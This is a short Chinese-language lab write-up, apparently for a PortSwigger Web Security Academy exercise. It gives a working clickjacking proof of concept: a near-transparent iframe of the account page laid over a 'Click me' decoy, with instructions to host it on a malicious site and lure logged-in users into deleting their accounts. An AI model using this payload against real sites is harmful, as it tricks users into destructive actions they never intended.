该网页有一个删除账户操作，存在安全的csrf令牌

但是可以尝试点击劫持



poc:

```javascript
//设置div和ifame标签的样式
<style>
//嵌入受害网站
   iframe {
       //位置：相对
       position:relative;
       width:500px;
       height: 700px;
       //透明度
       opacity: 0.1;
       z-index: 2;
   }
   div {
       //位置：完全的
       position:absolute;
       top:380px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ac6d1f2a1f15dcbf800204d2001f00b8.web-security-academy.net/account"></iframe>
```

将该脚本放置到恶意网站上，诱使用户再登陆受害网站时，访问该页面，用户只要点击了页面上的引诱性的小游戏，即可实现点击劫持。

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/点击劫持/images/7FE7B296A17B48D8B6286388EE1961A3clipboard.png)

